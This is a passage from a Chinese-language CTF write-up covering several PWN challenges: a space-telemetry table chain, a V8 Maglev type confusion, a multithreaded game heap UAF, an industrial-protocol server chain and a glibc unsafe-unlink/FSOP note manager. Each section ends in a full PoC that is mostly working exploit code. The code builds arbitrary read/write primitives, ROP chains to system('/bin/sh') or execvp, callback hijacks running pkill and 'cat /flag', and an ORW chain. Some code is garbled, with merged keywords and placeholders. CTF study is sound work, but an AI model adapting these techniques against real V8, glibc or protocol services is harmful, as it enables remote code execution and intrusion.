3.  封面方式上传 `hs_amt_x.tbl` ，加载、校验 `HS.AppMon_Tbl` ，暂不激活。
    
4.  发 `C` 帧carrier（APID `0x88` ，137B）等一个HK周期，让 `0x18B3` 载荷被搬成CF请求。
    
5.  激活 `HS.AppMon_Tbl` ，命中缺失应用后动作表发出 `0x18B3` ，CF读 `/cf/host/flag` 并以EID25的 `F` 帧回传。
    
6.  收 `F` 帧： `payload[0]&0x10` 且 `payload[4]==25` ，偏移payload\[7:<端口>\]、数据 `payload[11:]` ，排序拼接后匹配flag。动作表须先激活，AMT激活须晚于carrier搬运，错序则发空包不重试。
    

### 4\. PoC

```python
import re, socket, struct, sys, time

P = struct.pack

def ccsds(apid, code, body=b""):
    p = bytearray(P(">HHHBB", 0x1800 | apid, 0xC000, len(body) + 1, code, 0) + body)
    p[7] = 0xFF ^ p[0] ^ p[1] ^ p[2] ^ p[3] ^ p[4] ^ p[5] ^ p[6]
    return bytes(p)

def table_image(name, data):
    return P(">8I32s", 0x63464531, 8, 64, 0x42, 1, 0, 0, 0, b"Table Image") + P(">III40s", 0, 0, len(data), name.encode()) + data

def hk_entry(im, io, om, oo, n):
    return P("<IH2xIHH", im, io, om, oo, n)

def build():
    ent = [hk_entry(m, 12, 0x89C, 12 + 4 * i, 4) for i, m in enumerate((0x801, 0x805, 0x803, 0x800, 0x804))]
    ent += [hk_entry(0x1888, 8, 0x18B3, 8, 136), hk_entry(0x1888, 144, 0x18B3, 6, 1)]
    hk = table_image("HK.CopyTable", b"".join(ent).ljust(2048, b"\0"))
    mat = table_image("HS.MsgActs_Tbl", P("<HH4x16s", 1, 0, ccsds(0x9C, 0, P("<I", 0x18B3))))
    amt = table_image("HS.AppMon_Tbl", P("<20sHHH", b"NO_SUCH_APP", 0, 1, 4))
    cf = P("<BBBBI64s64s", 0, 1, 1, 0, 23, b"/cf/host/flag", b"flag")
    return hk, mat, amt, ccsds(0x88, 0, cf + b"\x20")

def cksum(content):
    pad = content + b"\0" * (-len(content) % 4)
    return sum(int.from_bytes(pad[i:i + 4], "big") for i in range(0, len(pad), 4)) & 0xFFFFFFFF

S, buf, parts = None, b"", {}

def send(kind, payload):
    S.sendall(kind + len(payload).to_bytes(4, "big") + payload)

def cfdp(mode, txn, data):
    send(b"C", ccsds(4, 0, bytes([mode]) + len(data).to_bytes(2, "big") + b"\0" + bytes([23, txn, 25]) + data))

def put(name, content, txn):
    nm = P(">I", len(name)) + name.encode()
    cfdp(0x20, txn, b"\x07\0" + P(">I", len(content)) + nm + nm)
    for off in range(0, len(content), 480):
        cfdp(0x30, txn, P(">I", off) + content[off:off + 480])
    cfdp(0x20, txn, b"\x04\0" + P(">II", cksum(content), len(content)))

def step(path, table, code):
    body = (b"/cf/uplink/" + path.encode()).ljust(64, b"\0") if code == 2else ((b"\0\0"if code == 4elseb"") + table.encode().ljust(40, b"\0"))
    send(b"C", ccsds(4, code, body))
    time.sleep(0.8)

def run(path, blob, table, codes, txn, cover=False):
    if cover:
        put(path, table_image("HK.CopyTable", bytes(len(blob) - 116)), txn)
    put(path, blob, txn)
    for code in codes:
        step(path, table, code)

def frames(wait):
    global buf
    S.settimeout(0.5)
    end = time.time() + wait
    while time.time() < end:
        try:
            buf += S.recv(65536)
        except socket.timeout:
            pass
        while len(buf) >= 5and len(buf) >= 5 + (ln := int.from_bytes(buf[1:5], "big")):
            data, buf = buf[5:5 + ln], buf[5 + ln:]
            if data[0] & 0x10and data[4] == 25:
                parts[int.from_bytes(data[7:<端口>], "big")] = data[11:]
                m = re.search(rb"flag\{[^}]+\}", b"".join(parts[k] for k in sorted(parts)))
                if m:
                    return m.group().decode()

hk, mat, amt, carrier = build()
S = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=5)
run("hk_cf.tbl", hk, "HK.CopyTable", (2, 4, 5), 200)
run("hs_mat_x.tbl", mat, "HS.MsgActs_Tbl", (2, 4, 5), 201, True)
run("hs_amt_x.tbl", amt, "HS.AppMon_Tbl", (2, 4), 202, True)
send(b"C", carrier)
frames(2)
step("hs_amt_x.tbl", "HS.AppMon_Tbl", 5)
print("flag:", frames(30))
```

* * *

## PWN5-Babyv8

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 混合题（附件+靶机） |
| 附件  | Babyv8.zip（含启用V8 sandbox的d8、两处补丁0006/0007、协议说明） |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

`d8` 以非root运行， `/flag` 仅root可读， `/readflag` 为setuid-root。sandbox与指针压缩同开，JS对象用32位压缩指针，带tag值不是进程地址，故先取cage内读写，再泄PIE劫持控制流。

补丁0006改 `TryMergeLoop` 与 `Phi::promote_post_loop_type` ：loop phi首输入为 `SmiConstant` 时跳过重展开，回边与入口取交集后仍留Smi，而回边可带对象，出口被错标Smi，存储按Smi处理。

触发用 `put(a,o,n)` ： `x` 首轮为常量0、之后取对象o，末尾 `a[0]=x` 。整数热身让Maglev编译后再传对象， `a[0]===o` 成立而元素种类仍是 `PACKED_SMI_ELEMENTS` ，槽内存32位压缩指针。 `String(a)` 按Smi转成数字， `addrOf` 用 `(n*2+1)>>>0` 还原带tag指针； `leaker[0]=42` 先解COW。

对已晋升的Smi数组 `a[0]=x` 会生成 `StoreFixedArrayElementNoWriteBarrier` ，对象指针进老年代却不登记老→新引用，GC扫不到，新生代对象搬走后槽位悬空。

伪JSArray头16B：+0x00 map= `0x0100baa9` 、+0x04 properties= `0x7e5` 、+0x08 elements= `base-8` 、+0x0c length= `0x20` （Smi 16）。数据区起点为 `addrOf(array)+23` ，按 `delta=(stale-1)-dataStart` 判断悬空地址是否在区内，8字节对齐两条 `u2f` 、错位三条跨槽。重占位后 `bads[i][0]` 即伪数组， `fake[1]` 改写宿主数组的elements与length；读写原语把 `fake[1]` 设为 `(addr-7)>>>0` ，宿主 `[0]` 落在目标地址（元素区+8、tag位1，共减7）。

补丁0007给 `FeedbackCell` 加 `cached_entrypoint` （ `+0x10` ）， `CallJSDispatchEntry` 直接取址 `call` ，绕开只读dispatch表。 `JSFunction+0x18` 存压缩FeedbackCell指针，未调用函数的入口仍是二进制地址，减 `0x315a380` 得PIE。

ROP布置在targetCell附近，偏移相对带tag的targetCell：

| 位置  | 内容  |
| --- | --- |
| +0x00 | `PIE+0x18bb132`<br><br>： `add rsp,0x10; pop rbp; ret` |
| +0x18 | `0`<br><br>，供pop rbp消耗 |
| +0x20 | `PIE+0x193a9cc`<br><br>： `xor esi,esi; ret` |
| +0x28 | `PIE+0x34be450`<br><br>： `execvp@plt` |
| +0x0f | `PIE+0x27e9e69`<br><br>： `push rbx; pop rsp; ret` ，最后写 |

`CallJSDispatchEntry` 用rbx取入口， `push rbx; pop rsp` 后rsp=targetCell，ret取+0x00跳过缓存字段到+0x20，再ret进execvp；rdi已指向目标JSFunction，起始字节改成 `/readflag` 即作路径，rsi清零。改函数头必须最后做。

### 3\. 解题过程

1.  热身 `put` ，probe确认 `probe[0]===probeObject` 且 `String(probe)` 不含 `[object` 。
    
2.  搬迁bads到老年代，再写入新对象并记压缩地址，一次搬迁使其悬空； `moveOnce` 以 `addrOf` 变化判定搬迁。
    
3.  大double数组按delta写伪JSArray头，跨槽补三条u2f。
    
4.  取 `length===16` 的伪数组，读FeedbackCell取 `cached_entrypoint` 减偏移得PIE。
    
5.  写ROP四项与对象头 `/readflag` ，最后写枢转gadget并 `caller(1)` 。
    

### 4\. PoC

```php
const view = newDataView(newArrayBuffer(8));
const u2f = (lo, hi) => (view.setUint32(0, lo >>> 0, true), view.setUint32(4, hi >>> 0, true), view.getFloat64(0, true));
const f2u = f => (view.setFloat64(0, f, true), [view.getUint32(0, true), view.getUint32(4, true)]);

function put(a, o, n) {
let x = 0;
for (let i = 0; i < n; i++) x = i === 0 ? 0 : o;
  a[0] = x;
return a;
}

const leaker = [0, 1];
leaker[0] = 42;
function addrOf(o) {
  put(leaker, o, 3);
const s = String(leaker);
return (Number(s.slice(0, s.indexOf(','))) * 2 + 1) >>> 0;
}

function garbage() { newArray(256).fill(1.1); }
function moveOnce(o) {
const before = addrOf(o);
for (let i = 0; i < 10000; i++) {
    garbage();
    if (addrOf(o) !== before) return;
  }
}

const MAP = 0x0100baa9, PROPS = 0x7e5, FAKE_SMI = 0x20;
const bads = [], stale = [];
for (let i = 0; i < 32; i++) {
const a = [0, 1];
  a[0] = 42;
  bads.push(a);
}
moveOnce(bads[0]);
for (let i = 0; i < 32; i++) {
const o = { i };
  put(bads[i], o, 3);
  stale.push(addrOf(o) - 1);
}
moveOnce(bads[0]);

const spray = newArray(2048).fill(1.1);
moveOnce(spray);
const base = addrOf(spray), d0 = base + 23, elem = (base - 8) >>> 0;
for (const s of stale) {
const off = (s - d0) >>> 0;
if (off >= 16368) continue;
const k = off >> 3;
if ((off & 7) === 0) {
    spray[k] = u2f(MAP, PROPS);
    spray[k + 1] = u2f(elem, FAKE_SMI);
  } else {
    spray[k] = u2f(0, MAP);
    spray[k + 1] = u2f(PROPS, elem);
    spray[k + 2] = u2f(FAKE_SMI, 0);
  }
}

let fake = null;
for (const a of bads) {
if (a[0]?.length === 16) { fake = a[0]; break; }
}

function read64(addr) {
  fake[1] = u2f((addr - 7) >>> 0, FAKE_SMI);
return f2u(spray[0]);
}
function write64(addr, lo, hi) {
  fake[1] = u2f((addr - 7) >>> 0, FAKE_SMI);
  spray[0] = u2f(lo, hi);
}

const target = newFunction('x', 'let y=x;' + 'y+=1;'.repeat(1000) + 'return y;');
function caller(x) { return target(x); }
for (let i = 0; i < 1e5; i++) caller(i);
const cold = x => x;

const tCell = read64(addrOf(target) + 0x17)[0];
const c = read64(read64(addrOf(cold) + 0x17)[0] + 0x0f);
const pie = c[0] + c[1] * 4294967296 - 0x315a380;

const q = v => [v >>> 0, (v / 4294967296) | 0];
write64(tCell + 0x18, 0, 0);
write64(tCell + 0x20, ...q(pie + 0x193a9cc));
write64(tCell + 0x28, ...q(pie + 0x34be450));
write64(tCell, ...q(pie + 0x18bb132));
write64(addrOf(target) - 1, 0x6165722f, 0x616c6664);
write64(addrOf(target) + 7, 0x67, 0);
write64(tCell + 0x0f, ...q(pie + 0x27e9e69));
caller(1);
```

* * *

## PWN6-bad_puppet

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 混合题（附件+靶机） |
| 附件  | bad_puppet.zip（二进制、启动脚本与运行库） |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

塞尔达主题的C++多线程网络游戏，纯文本协议一行一条命令，进程内6个线程（命令、战斗、背包、地图、商店、交易）共享同一堆。物品按 `0x170` 字节chunk分配（可用 `0x160` ），落在tcache索引21。相关命令： `shop buy <id> <count>` 、 `inv equip|unequip|drop|sort|list` 、 `mw pickup|show|whisper` 。 `mw show` 按装备槽打印 `description_addr/head/key` ， `mw whisper <slot> <hex>` 把十六进制写进描述缓冲区，上限127B且只接受 `RingItem` ，整条链以戒指为载体。

漏洞一： `inv drop <idx>` 先 `clone_item` 、再 `destroy_item` 、最后 `erase_inventory` ，但装备表 `g_equipment` 里的指针不会摘除。丢弃已装备物品后原chunk回到tcache，背包里没有它，装备表仍指向它； `mw show` / `mw whisper` 按下标取指针，直接退化成读/写已释放chunk。释放后头部为 `+0x00` next（safe-linking，写入值 `(chunk>>12)^next` ）、 `+0x08` key、 `+0x10` 原物品字段。

漏洞二：交易线程不立即执行 `equip` / `unequip` ，而是排队；处理时按slot回查当前占用者克隆，释放却用事件入队时捕获的旧指针，队列积压时克隆源与释放目标错开，一次多释放一个块，把tcache计数从1抬到2。命令线程持有全局表、交易线程异步克隆，两者叠加才让清理范围小于引用范围、释放次数多于克隆次数。

关键偏移：

| 名称  | 值   |
| --- | --- |
| `main_arena` | `0x204ac0` |
| `environ` | `0x20bd58` |
| `system` | `0x58750` |
| `/bin/sh` | `0x1cc42f` |
| `pop rdi; ret` | `0x10c08d` |
| `command_loop`<br><br>返回地址 | PIE `+0x5118` |
| 返回槽相对 `environ` | `-0x278` |
| `g_puppet`<br><br>相对堆基址 | `+0xcf0` |
| `malloc_state`<br><br>相对堆基址 | `+0x8a0` |
| 伪chunk大小 | `0x101` |

远程堆落在 `0x55...`主arena， `malloc_state` 嵌在libc数据段， `next` 指向libc内bin数组，减去 `0x204ac0` 才得基址；本地用附件运行库启动时物品块常落在 `0x7f...`的thread arena，同一偏移读出的不是main_arena，须先填满索引21让第8个块进unsorted bin取arena地址。

### 3\. 解题过程

1.  经济漏洞： `shop buy 3 0x100000001` ，单价按uint32截断为1只收64卢比，发货按uint64到账42亿炸弹。
    
2.  `map teleport castle` 、 `battle` 、 `use item 1 32` 秒Boss， `mw pickup 0` 捡戒指， `inv equip 2` 装备。
    
3.  `mw show` 取 `description_addr` 即戒指chunk地址A； `inv drop 2` 后装备槽仍指向A。
    
4.  再 `mw show` 读A处tcache头：next为 `(A>>12)^0` ，key指向tcache结构，确认它在索引21表头；堆基址 `P=A&~0xFFFFFF` 。
    
5.  `inv equip 0` 与 `inv unequip 0` 交替400次灌满交易队列，再 `inv drop 0` 、 `inv drop 1` ，计数变2。
    
6.  投毒：取T=A+0x80，写 `next=(A>>12)^T` 、payload\[120:<端口>\]=0x101，两个装备槽各写一遍； `shop buy 0 2` 加 `inv sort` ，第二次分配落到T。
    
7.  任意读：把T换成 `P+0xcf0` 即 `g_puppet` 表，克隆数据全填待读地址X， `inv list` 打印的十进制即 `*(X)` ；读 `P+0x8a0` 得main_arena， `libc=leak-0x204ac0` ，再读 `environ` 。
    
8.  栈上ROP：目标 `environ-0x278` ，依次写 `pop rdi; ret` 、 `/bin/sh` 、 `system` ， `quit` 使 `command_loop` 返回触发。
    

### 4\. PoC

```python
import re, socket, struct, time

HOST, PORT = "<靶机地址>", 9999

def p64(x):
    return struct.pack("<Q", x)

class Game:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=8)
        self.s.settimeout(0.4)

    def read(self, wait=0.8):
        end, out = time.time() + wait, b""
        while time.time() < end:
            try:
                chunk = self.s.recv(65536)
                ifnot chunk:
                    break
                out += chunk
            except socket.timeout:
                if out:
                    break
        return out.decode("latin-1", "replace")

    def cmd(self, line, wait=0.8):
        self.s.sendall((line + "\n").encode())
        return self.read(wait)

    def show(self, slot):
        text = self.cmd("mw show")
        line = [x for x in text.splitlines() if x.strip().startswith("[%d]" % slot)][0]
        return [int(v, 16) for v in re.findall(r"0x[0-9a-f]+", line)]

    def whisper(self, slot, data):
        self.cmd("mw whisper %d %s" % (slot, data.hex()))

def poison(g, A, target):
    payload = (p64((A >> 12) ^ target) + b"\0" * 0x70 + p64(0x101))[:<端口>]
    g.whisper(0, payload)
    g.whisper(1, payload)

def alloc2(g):
    g.cmd("shop buy 0 2", 1.2)
    g.cmd("inv sort")

def read64(g, A, P, addr):
    # 每轮读前重做dup与投毒，戒指仍留在索引21
    poison(g, A, P + 0xcf0)
    g.whisper(0, p64(addr) * 15)
    g.whisper(1, p64(addr) * 15)
    alloc2(g)
    out = g.cmd("inv list")
    return int(re.findall(r"#(\d+)", out)[0])

def main(host, port):
    g = Game(host, port)
    g.cmd("shop buy 3 0x100000001", 1.5)
    g.cmd("map teleport castle")
    g.cmd("battle", 3)
    g.cmd("use item 1 32")
    g.cmd("mw pickup 0")
    g.cmd("inv equip 2")
    A = g.show(2)[0]
    g.cmd("inv drop 2")
    g.show(2)
    P = A & ~0xFFFFFF

    for _ in range(400):
        g.cmd("inv equip 0", 0.02)
        g.cmd("inv unequip 0", 0.02)
    g.cmd("inv drop 0")
    g.cmd("inv drop 1")

    poison(g, A, A + 0x80)
    alloc2(g)
    arena = read64(g, A, P, P + 0x8a0)
    libc = arena - 0x204ac0
    stack = read64(g, A, P, libc + 0x20bd58) - 0x278

    poison(g, A, stack)
    g.whisper(0, p64(libc + 0x10c08d) + p64(libc + 0x1cc42f) + p64(libc + 0x58750))
    alloc2(g)
    g.cmd("quit")
    print(g.cmd("cat /flag", 2))

main(HOST, PORT)
```

* * *

## PWN7-Blackout

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 混合题（附件+靶机） |
| 附件  | Blackout.zip（bin/、filestore/、run.sh、Dockerfile、mlclient.conf） |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

run.sh用setpriv把两个守护进程降权拉起，各套while true循环，退出2秒后重启。server_sg5000（ied）监听102， `+net_bind_service` 能力跨execve保留，派生子进程仍可绑低端口；sg_masterlink（oper）按mlclient.conf连127.0.0.1:<端口>，poll_ms=4000，日志/srv/mlc/data/ml.log记录PIE、libc与句柄。 `/flag` 为root:oper 0440，ied读不到，必须借oper进程。

利用主线：装置侧UAF加FileRead下溢取任意读写，改IsoConnection回调拿ied shell，抢占102伪装服务端，再改reportHandler读flag。

-   数据集UAF：删除前用strlen比较数据集名与RCB的DatSet， `TL0/LLN0$assetds` 与 `LLN0$assetds` 长度不等即漏判，DataSet被free而RCB指针仍在；写GI触发总召，报告把释放块当DataReference带出。
    
-   FileRead下溢：InitiateRequest把maxPduSize协商成16，FileRead算分片长度得负数，按无符号大数用，写点越过发送窗口落到CotpConnection；伪造ByteBuffer后 `buffer=entry-0x13` 、 `maxSize=0x100000` ，写入落在悬空entry。
    
-   主站侧：伪服务端回 `local-detail-calling=0` ，sg_masterlink算出 `maxFileChunkSize=0-0x14=0xFFFFFFEC` ，作为fread长度被当无符号，整个报告读进65100字节缓冲区，溢出持久化响应ByteBuffer的buffer指针。
    

| 项目  | 值   |
| --- | --- |
| ISO B/X相对V | \-0x248E0 / -0x34810 |
| 悬空entry / 伪ByteBuffer / 命令缓冲 | V+0xE70 / B+0x2000 / B+0x2100 |
| r1.bin / r2.bin长度 | 0x13F60 / 0x11000 |
| CotpConnection发送窗口 | 77000 |
| msgRcvdHandler / tickHandler / handlerParameter | X+0x50 / X+0x58 / X+0x60 |
| reportHandler / reportHandlerParam | H+0x88 / H+0x90 |
| response缓冲区落点 | H+0x78 |
| Stage2命令在载荷内偏移 | 0xC0 |

### 3\. 解题过程

1.  server_sg5000动态链接libsgcomm.so.2且不做认证，sg_masterlink静态链接同一协议栈；装置文件区/srv/filestore对ied可写，主站区/srv/mlc/data不互通。
    
2.  向 `TL5/TSNC$SP$TsynReq$ReqStr` 写值，TsynReq处理函数把它当同步请求指针解引用，空指针退出；窗口内循环connect抢首条关联，IsoConnection、CotpConnection与收发缓冲按固定顺序切出，UAF泄漏恰5字节才算成功。
    
3.  建7个31字节名字的变量列表占满tcache，绑定 `LLN0$assetds` 并配RCB的DatSet/OptFlds/TrgOps/RptEna，删数据集后写GI取泄漏，还原 `V=(leak<<12)|0x3C0` 、 `B=V-0x248E0` 、 `X=V-0x34810` 、 `entry=V+0xE70` 。
    
4.  上传0x13F60的rc.bin塑造CotpConnection，发Initiate(16)+FileRead越界，再写entry（variableName=目标）并写GI，DataReference即目标处C字符串；读X+0x50得msgRcvdHandler，libsg=值-0x45A10，读 `libsg+0xCA150` 取free。
    
5.  free减候选偏移回读4字节为 `\x7fELF` 才确认libc（2.35 0xA53A0/0x50D70，2.39 0xADE30/0x58750）。
    
6.  FileRead r1.bin重写CotpConnection（size=77000、payload=X+0x08），再读r2.bin触发COTP分片，偏移65512/65520/65528覆盖X+0x50/0x58/0x60为system/system/B+0x2100，定时回调执行 `pkill -9 -f '[s]erver_sg5000'` 并拉起载荷。
    
7.  载荷以ied身份bind <靶机地址>，等重启后的sg_masterlink连接，读回ml.log取最新H、PIE与libc。
    
8.  FileRead 65112字节把response->buffer改成H+0x78，读256字节载荷覆盖H+0x88/H+0x90，发InformationReport触发reportHandler执行 `cat /flag > /srv/filestore/out.txt; chmod 666` ；重启真实服务后读out.txt取flag。
    

### 4\. PoC

```powershell
p64 = lambda x: struct.pack("<Q", x)
## 帧构造函数（associate/define/write/obtain_file/file_read）按BER拼装，略

def prep(host, port):                     # 打崩->抢首关联->UAF泄漏
    for _ in range(6):
        crash(host, port); c = Mms(host, port)
        body = tlv(0x30, tlv(0xA0, tlv(0x1A, b"TL4") + tlv(0x1A, b"GGIOM")))
        for i in range(7):               # 短名字占用tcache
            c.define_raw(b"F%02d" % i + b"A" * 29, body)
        c.define_dataset(b"LLN0$assetds", ENTRY_BODY)
        c.write("LLN0$RP$urcLd0Ev$DatSet", b"TL0/LLN0$assetds")
        c.write("LLN0$RP$urcLd0Ev$RptEna", b"\x01")
        c.delete_dataset(b"TL0/LLN0$assetds")      # strlen漏判，引用计数为0
        c.write("LLN0$RP$urcLd0Ev$GI", b"\x01")
        leak = c.recv()
        if len(leak) == 5:
            V = (int.from_bytes(leak, "little") << 12) | 0x3C0
            return c, {"B": V - 0x248E0, "X": V - 0x34810, "entry": V + 0xE70}
        c.close()

def ar(c, lay, target, rc):               # rc.bin塑造CotpConnection
    c.upload("/rc.bin", rc)
    c.send(initiate_frame(16)); c.file_read("/rc.bin", len(rc))
    c.send(patch_entry(0x38, target))     # variableName=target
    c.write("LLN0$RP$urcLd0Ev$GI", b"\x01"); return c.recv()

def libs(c, lay, rc):
    libsg = u64(ar(c, lay, lay["X"] + 0x50, rc).ljust(8, b"\0")) - 0x45A10
    free = u64(ar(c, lay, libsg + 0xCA150, rc).ljust(8, b"\0"))
    for f, s in ((0xA53A0, 0x50D70), (0xADE30, 0x58750)):
        if ar(c, lay, free - f, rc)[:4] == b"\x7fELF":
            return free - f + s

def rce(c, lay, system):                  # 命令串由rc.bin放在B+0x2100
    B, X = lay["B"], lay["X"]
    r1 = bytearray(0x13F60); r1[0x08:0x10] = p64(X + 0x08)
    r1[0x10:0x18] = p64(77000); r1[0x18:0x20] = p64(B + 0x2000)
    r2 = bytearray(0x11000)               # 分片65512/65520/65528落X+0x50/58/60
    for n, b in (("/r1.bin", r1), ("/r2.bin", r2)):
        c.upload(n, bytes(b)); c.file_read(n, len(b))

def inner(system, cur):                   # 第二阶段载荷，以ied身份运行
    srv = socket.socket()
    srv.bind(("<靶机地址>", 102)); srv.listen(1); cli = srv.accept()[0]
    cli.sendall(initiate_response(local_calling=0))   # 0xFFFFFFEC
    H = handle_from_log(cli)                          # ml.log取最新句柄
    over = b"\0" * (65088 - cur) + p64(0) + p64(0x21) + p64(H + 0x78)
    pay = p64(system) + p64(H + 0x148) + b"\0" * (0xC0 - 0x10) + CMD
    serve(cli, "/overflow.bin", over); serve(cli, "/payload.bin", pay)
    cli.sendall(information_report())                 # reportHandler->system
```

载荷即inner源码。

* * *

## PWN8-drywell

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 混合题（附件+靶机） |
| 附件  | drywell.zip内含pwn_drywell.tar.gz：chal、chal.c、libc.so.6、ld-linux-x86-64.so.2、Dockerfile、run.sh、flag.txt |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

12格note管理器， `Note{char *data; unsigned long len, cap;}` ， `notes=calloc(12,0x18)` 得0x130块，落在heap+0x10，故 `notes[i]=heap+0x10+0x18*i` ，改 `notes[7].data` 即改 `T=heap+0x10+0x18*7` 。class请求0x4f8/0x8f8/0xff8对应chunk 0x500/0x900/0x1000，全越过tcache与smallbin上限，只能走unsorted/largebin；view仅8次，free清空字段，无UAF。

漏洞在edit末尾的一字节越界： `n->data[n->cap] = ((len>>4 ^ poison_key) & 0xe) << 4 | (n->data[n->cap] & 0x0f)` 。

`data[cap]` 正是下一块size的最低位，只改高半字节，低4位（PREV_INUSE）与高7字节保留，因此0x500可变成0x5a0或0xb00这类只放大不改归属的值。可写的半字节由len决定且受 `len<=cap` 限制，所以要先探出 `poison_key` 低4位；key来自/key，socat fork的各连接共享，一次探测对整实例有效。

利用链：0xa0余块压note2泄漏libc与堆→合并出0x10a0让note6覆盖7/8/9→unsafe unlink改notes\[7\].data为T-0x18→写穿ledger改note8.data为\_IO_list_all→note9/10/11放伪FILE与vtable→quit触发flush_all走setcontext执行ORW。

| 名称  | 偏移（glibc 2.43） |
| --- | --- |
| unsorted fd→libc基址 / 堆泄漏→heap基址 | 0x212ac8 / 0x1030 |
| pop rsp; ret / pop rdi; ret | 0x3ca45 / 0x11b9fa |
| pop rsi; ret / pop rbp; ret | 0x11ccbb / 0x2aafc |
| pop rdx; leave; ret / setcontext+0x2d | 0x9fead / 0x4bead |
| \_IO_wfile_jumps / \_IO_list_all | 0x211228 / 0x213480 |

### 3\. 解题过程

1.  探key：0..14步长2枚举，每次3次add(0)、一次 `edit(0, b'Q'*len)` 、一次 `free(1)` ，连接不断即命中。
    
2.  双泄漏：5次add(0)后，把note2的下一块size与再下一块PREV_INUSE写成0x21（0x98、0xb8），note1的size拉到0x5a0，free(1)再add(0)切出0xa0余块压在note2；free(3)进unsorted，两次view得 `libc=leak-0x212ac8` 、 `heap=leak-0x1030` 。
    
3.  前向合并：再8次add(0)填满3、5..11；note7造自链空闲块（fd=bk=n7+0x90、size=0xb01），note9写prev_size=0xb00、size=0x20，note5拉到0x5a0，free(6)合并出0x10a0，add(2)后新note6覆盖7/8/9。
    
4.  unsafe unlink：note6造前驱块（size=0x4f1、fd=T-0x18、bk=T-0x10），note8写prev_size=0x4f0、size=0x500，note9的size补回0x501，free(8)通过检查并把notes\[7\].data改成T-0x18。
    
5.  FSOP：note11放伪vtable（+0x68=setcontext+0x2d，+0x100放路径），note10放伪\_IO_wide_data并铺三段ORW链（+0xe0指向vtable），note9放伪FILE：\_flags=0xfbad8000、\_wide_data=n10、\_freeres_buf=pop rsp、\_mode=1、vtable=\_IO_wfile_jumps、+0x1c0=0x1f80。
    
6.  改ledger：notes\[7\].data已是T-0x18， `edit 7` 写0x90字节即覆盖notes\[6..11\]，把note8.data改成\_IO_list_all，再 `edit 8` 写伪FILE地址。
    
7.  触发：quit进入exit的flush_all，伪FILE经\_IO_wfile_jumps走宽字符overflow， `_wide_vtable->__doallocate` 跳setcontext，从n10链首pivot执行openat→read(3)→write(1)→\_exit。
    

### 4\. PoC

```python
def L(n):
    return n + ((k & 0xe) << 4)

def S(n, hi):
    return n + (((k ^ hi) & 0xe) << 4)

def put(b, off, v):
    b[off:off + 8] = p64(v)

def probe(io):
    for k in range(0, 15, 2):
        t = io.clone()
        try:
            for _ in range(3):
                t.add(0)
            t.edit(0, b'Q' * (0x100 + ((k & 0xe) << 4))); t.free(1)
            return k
        except EOFError:
            pass

k = probe(io)
for _ in range(5):
    io.add(0)
b = bytearray(L(0x200)); put(b, 0x98, 0x21); put(b, 0xb8, 0x21)
io.edit(2, b)
io.edit(0, b'A' * S(0x100, 0xa))
io.free(1); io.add(0)
io.free(3)
libc = u64(io.view(2, 0)) - 0x212ac8
heap = u64(io.view(2, 8)) - 0x1030

for _ in range(8):
    io.add(0)
n6 = heap + 0x2250
n7 = n6 + 0x500
n9, n10, n11 = n6 + 0xf00, n6 + 0x1400, n6 + 0x1900
fake = n7 + 0x90
b = bytearray(L(0x200)); put(b, 0x98, 0xb01)
put(b, 0xa0, fake); put(b, 0xa8, fake)
io.edit(7, b)
b = bytearray(L(0x200)); put(b, 0x190, 0xb00); put(b, 0x198, 0x20)
io.edit(9, b)
io.edit(5, b'A' * S(0x100, 0xa))
io.free(6); io.add(2)

T = heap + 0x10 + 0x18 * 7
b = bytearray(S(0xf00, 0xa))
put(b, 0x508, 0x4f1); put(b, 0x510, T - 0x18); put(b, 0x518, T - 0x10)
put(b, 0x9f0, 0x4f0); put(b, 0x9f8, 0x500); put(b, 0xef8, 0x501)
io.edit(6, b)
io.free(8)

pop_rsp, pop_rdi, pop_rsi, pop_rbp = libc + 0x3ca45, libc + 0x11b9fa, libc + 0x11ccbb, libc + 0x2aafc
pop_rdx_leave = libc + 0x9fead
vt = bytearray(L(0x300)); put(vt, 0x68, libc + 0x4bead); vt[0x100:0x105] = b'/flag'
io.edit(11, vt)

w = bytearray(L(0x400)); chain, f1, f2, f3 = 0x100, 0x188, 0x248, 0x308
put(w, 0, n10 + chain); put(w, 0x18, 0); put(w, 0x20, 1); put(w, 0x30, 0)
put(w, 0xe0, n11)

def wr(base, vals):
    for i, v in enumerate(vals):
        put(w, base + 8 * i, v)

wr(chain, [pop_rdi, -100, pop_rsi, n11 + 0x100, pop_rbp, n10 + f1, pop_rdx_leave, 0])
wr(f1, [0, libc + 0x127a90, pop_rdi, 3, pop_rsi, n11 + 0x180, pop_rbp, n10 + f2, pop_rdx_leave, 0x100])
wr(f2, [0, libc + 0x128150, pop_rdi, 1, pop_rsi, n11 + 0x180, pop_rbp, n10 + f3, pop_rdx_leave, 0x100])
wr(f3, [0, libc + 0x128c10, libc + 0xf7180])
io.edit(10, w)

f = bytearray(L(0x300))
for off, v in ((0, 0xfbad8000), (0x68, 0), (0x88, n11 + 0x280), (0xa0, n10),
               (0xa8, pop_rsp), (0xc0, 1), (0xd8, libc + 0x211228),
               (0xe0, n9 + 0x200), (0x1c0, 0x1f80)):
    put(f, off, v)
io.edit(9, f)

addrs = (n6, T - 0x18, libc + 0x213480, n9, n10, n11)
a = b''.join(p64(x) + p64(0) + p64(0xff8if i == 6else0x4f8) for i, x in enumerate(addrs, 6))
io.edit(7, a)
io.edit(8, p64(n9))
io.send(b'quit\n')
print(io.recvall(timeout=3))
```

n6为ledger里的堆地址heap+0x2250，n7..n11按堆布局推算。

* * *

## PWN9-easytl

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 附件题（无靶机环境） |
| 附件  | easytl.zip（含easytl、server.crt、server.key） |
| 目标  | 无（离线附件） |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

